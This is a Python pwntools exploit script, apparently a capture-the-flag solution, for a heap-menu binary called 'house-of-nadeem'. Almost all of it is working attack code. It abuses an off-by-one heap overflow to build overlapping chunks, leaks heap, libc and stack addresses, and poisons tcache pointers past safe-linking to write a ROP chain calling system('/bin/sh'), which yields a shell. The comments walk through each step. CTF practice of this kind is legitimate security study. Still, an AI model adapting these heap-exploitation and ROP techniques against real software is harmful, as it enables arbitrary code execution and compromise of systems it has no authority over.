#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

# exe = "./house-of-nadeem"
exe = "./house-of-nadeem_patched"

elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(argv=[exe], aslr=True)
if args.GDB: gdb.attach(io, """
    b *main+791
""")

def menu(i, delim="$"):
    io.sendlineafter(encode(delim), encode(i))

def malloc(idx, sz):
    menu(1)
    menu(idx, delim="?")
    menu(sz, delim="?")

def free(idx):
    menu(2)
    menu(idx, delim="?")

def read(idx):
    menu(3)
    menu(idx, delim="?")
    return io.recvuntil(b" ===")[:-4]

def write(idx, data, ln=True):
    menu(4)
    menu(idx, delim="?")
    (io.sendline if ln else io.send)(encode(data))

"""
Allocate 4 chunks.
"""
malloc(0x0, 0x28)
malloc(0x1, 0x28)
malloc(0x2, 0x28)
malloc(0x3, 0x28)

"""
Now when writing, we have 1-byte write
into the next chunk.

Meaning, we can write into the size field
of the next chunk.
"""
write(0x0, cyclic(0x28)+b"\x91")

"""
We free all allocations except the first one.
And then allocate the second chunk of size 0x88 bytes, because
using our off-by-one, we wrote into the next chunk's size field.

Now, the second and third free chunks are in a region we control
(our 0x88 byte chunk), we can overwrite their *next field
and gain arbitrary address allocation.
"""
free(0x1)
free(0x2)
free(0x3)

"""
This chunk will be the overlapping chunk.
"""
malloc(0x1, 0x88)

"""
Read to get a leak to the heap:
"""
heap = u64(read(0x1)[0x30:0x38]) << 4
info("heap @ %#x" % heap)

"""
Using our overlapping allocation, allocate
a chunk into a section that will give us
leak into libc. We can use `p2p heap libc` in pwndbg
or `scan heap libc` in gef.

Now, because of this line:

fdopen(2, "w+");

A new FILE* will be added on the heap.
Which will eventually give us a leak to libc.
So, we just need to invoke an error:
"""
menu(5)

"""
Get the leak to libc by simply increasing the
size of a chunk like we did before.

This time, we'll target the last chunk, i.e. 3
because we only have 1-byte overflow and allocate a
max chunk of size `0xf1`.

To cater that, we'll allocate our chunk 2 and 3,
change the size field of chunk 3, free the chunk,
re-allocate the chunk with a larger chunk size,
and then read for libc leak.

> Keep in account the reverse allocations.
"""
malloc(0x3, 0x28)
malloc(0x2, 0x28)

write(0x2, cyclic(0x28)+b"\xf1")
free(0x3)   
malloc(0x3, 0xe8)

menu(0x3)
menu(0x3, delim="?")
read(0x3)
libc.address = u64(read(0x3)[0x99:0xa1]) - 0x2044e0
info("libc @ %#x" % libc.address)

"""
From here, we'll get a stack leak by allocating a chunk
in a libc area where we'll have a leak to the stack.

> We can find that using `p2p` or `scan`

To do that, we'll firstly fix our existing chunks, and then
free both of these chunks. Then, using our already existing
larger chunk, we'll write the addres into *next of our chunk.
This will give us our arbitrary address allocation primitive.

> One thing, the chunk we're modifying must be at top of the
linked list (i.e. just freed, so when we modify the *next,
it will keep this as (current->next) and (current->next->next)
will exist. If it doesn't exist, we won't have AAA.
"""
libc_stack = libc.address + 0x2046e0
info("allocating a chunk @ %#x" % libc_stack)

write(0x2, cyclic(0x28)+b"\x31")
free(0x3)
free(0x2)

fake_chunk = flat(
    cyclic(0x28, n=8),
    p64(0x31), # size field of the next chunk
    (libc_stack - 0x10) ^ (heap >> 12), # *next
    0x0, # *key
)
write(0x1, fake_chunk)

malloc(0x2, 0x28)
malloc(0x3, 0x28) # this will be our fake chunk

stack = u64(read(0x3)[0x11:0x19])
ret = stack - 0x120
info("stack @ %#x" % stack)
info("ret @ %#x" % ret)

"""
Now, we'll do another arbitrary address allocation on return.
"""
malloc(0x0, 0x48)
malloc(0x1, 0x48)
malloc(0x2, 0x48)
malloc(0x3, 0x48)
write(0x0, cyclic(0x48)+b"\x91")
free(0x1)
free(0x3)
free(0x2)
malloc(0x1, 0x88)

"""
We will subtract 0x8 from our return address
This is because the return address ends in 0x8
And malloc expects the chunk be to end in 0x00.
"""
fake_chunk = flat(
    b"A"*0x48,
    p64(0x51),
    (ret-0x8) ^ (heap >> 12),
    0x0,
)
write(0x1, fake_chunk)
malloc(0x2, 0x48)
malloc(0x3, 0x48)

"""
Now, whatever we write in 0x3, will be at our return address:
"""
POP_RDI = libc.address + 0x000000000010f75b
RET = POP_RDI + 1
chain = flat(
    b'BBBBBBBB', # rbp
    POP_RDI,
    next(libc.search(b"/bin/sh\x00")),
    RET,
    libc.sym.system
)
write(0x3, chain)
menu(0)

io.interactive()